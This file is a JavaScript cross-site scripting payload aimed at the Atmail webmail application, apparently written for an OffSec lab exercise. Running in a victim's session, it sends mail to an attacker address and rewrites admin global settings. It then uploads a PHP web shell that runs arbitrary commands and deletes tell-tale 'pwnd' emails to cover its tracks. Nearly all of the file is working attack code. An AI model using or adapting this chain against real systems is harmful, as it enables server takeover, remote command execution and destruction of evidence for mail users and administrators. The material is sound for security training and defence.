/* 
// The uri inbox
http://atmail/index.php/mail/mail/listfoldermessages/selectFolder/INBOX',true);

// Delete emails from inbox
// http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash?resultContext=messageList&listFolder=INBOX&pageNumber=1&mailId%5B%5D=5

// Delete emails from trash
// http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX.Trash/toFolder/INBOX.Trash/actuallyDelete/1?resultContext=messageList&listFolder=INBOX.Trash&pageNumber=1&mailId%5B%5D=4
I discovered that we can combine the uri for deletion from inbox and deletion from trash using:
http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash/actuallyDelete/1?resultContext=messageList&listFolder=INBOX&pageNumber=1

*/
function send_email() 
{ 
    var email = "attacker@offsec.local";
    var subject = "hacked!";
    var message = "This is a test email!";
    var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";
    var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;
    xhr = new XMLHttpRequest();
    xhr.open("GET", uri + query_string, true);
    xhr.send(null);
}
send_email();
function read_body(xhr) {
   var data;
   if (!xhr.responseType || xhr.responseType === "text") {
       data = xhr.responseText;
   } else if (xhr.responseType === "document") {
       data = xhr.responseXML;
   } else if (xhr.responseType === "json") {
       data = xhr.responseJSON;
   } else {
       data = xhr.response;
   }
   return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        data = read_body(xhr);
        console.log(data);
    }
}
function neatAndTidy()
{
    var email_ids = document.getElementsByName("mailId[]");
    var email_subjs = document.getElementsByClassName("mailSubject");
    console.log(email_ids);
    console.log(email_subjs);
    var target = `http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash/actuallyDelete/1?resultContext=messageList&listFolder=INBOX&pageNumber=1`;
    for(let i = 0; i < email_subjs.length; ++i) 
    { 
        if (email_subjs[i].textContent.includes("You haz been pwnd"))
        {   
            // delete request
            //console.log('deleting', email_ids[i].attributes[2].nodeValue);
            target+=`&mailId%5B%5D=${email_ids[i].attributes[2].nodeValue}`
        }
    }
    // remove email from backend
    xhr.open('POST',target,true);
    xhr.send(null);
    // remove email from frontend
    document.querySelector('#folder_inbox > a:nth-child(1)').click();
}
function createContact()
{
    var target = 'http://atmail/index.php/mail/contacts/updatecontact';
    var fname = '1eqweq';
    var lname = 'sdsdfs';
    var pnum='1234567890';
    var email='test%40test.com';
    var street_addrs ="sdfsdfs";
    var city="sdfsdfsdfsqwq";
    var state="sdfsdfs";
    var zip="12345";
    var country="xzczxcz";
    var params = `contact%5Bid%5D=&contact%5BserverID%5D=&contact%5BNewContact%5D=1
    &contact%5BGroupID%5D=&contact%5Bfavourite%5D=0&contact%5BUserFirstName%5D=${fname}
    &contact%5BUserLastName%5D=${lname}
    &contact%5BnumberFieldName%5D%5B%5D=UserHomePhone&contact%5BnumberValue%5D%5B%5D=${pnum}
    &contact%5BemailFieldName%5D%5B%5D=UserEmail&contact%5BemailValue%5D%5B%5D=${email}
    &contact%5BUserHomeAddress%5D=${street_addrs}
    &contact%5BUserHomeCity%5D=${city}&contact%5BUserHomeState%5D=${state}
    &contact%5BUserHomeZip%5D=${zip}&contact%5BUserHomeCountry%5D=${country}
    &contact%5BUserWorkAddress%5D=&contact%5BUserWorkCity%5D=
    &contact%5BUserWorkState%5D=&contact%5BUserWorkZip%5D=
    &contact%5BUserWorkCountry%5D=
    &contact%5BUserWorkCompany%5D=&contact%5BUserTitle%5D=
    &contact%5BUserMiddleName%5D=&contact%5BUserDOB%5D=
    &contact%5BUserURL%5D=&contact%5BUserWorkTitle%5D=
    &contact%5BUserWorkDept%5D=&contact%5BUserInfo%5D=`;
    target += '?' + params;
    xhr.open('POST',target,true);
    xhr.send(null);
}
function injectWebShell() {
    var global_settings_poison_url = `http://atmail/index.php/admin/settings/globalsave?save=1&fields%5Bsql_host%5D=127.0.0.1
    &fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields%5BtmpFolderBaseName%5D=`;
    xhr.open("POST", global_settings_poison_url, false);
    xhr.send(null);
    var webshell_url = 'http://atmail/index.php/mail/composemessage/addattachment/composeID/';
    xhr.open("POST", webshell_url, false);
    var boundary = '---------------------------';

    boundary += Math.floor(Math.random()*32768);
    boundary += Math.floor(Math.random()*32768);
    boundary += Math.floor(Math.random()*32768);
    xhr.setRequestHeader("Content-Type", 'multipart/form-data; boundary=' + boundary);
    var body = '';
    body += '--' + boundary + '\r\n' + 'Content-Disposition: form-data; name="newAttachment"; filename="cuckedd.php"';
    body += '\r\n\r\n';
    body += "<?php system($_GET['cmd'])?>";
    body += '\r\n'
    body += '--' + boundary + '--';
    xhr.send(body);
}
//createContact();
injectWebShell();
neatAndTidy();


